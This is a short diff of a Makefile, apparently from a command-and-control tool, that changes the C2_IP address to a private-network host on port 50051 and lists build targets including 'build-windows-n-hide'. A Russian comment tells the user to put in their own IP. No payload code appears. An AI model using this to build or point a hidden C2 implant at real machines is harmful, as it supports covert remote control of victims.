@@ -2,7 +2,8 @@
 
 all: proto build-linux build-windows-n-hide
 
-C2_IP = "10.74.215.204:50051" # айпи поменять на свой, порт тот же
+# айпи поменять на свой, порт тот же
+C2_IP = 192.168.1.182:50051
 
 proto:
 	protoc --go_out=. --go_opt=paths=source_relative \
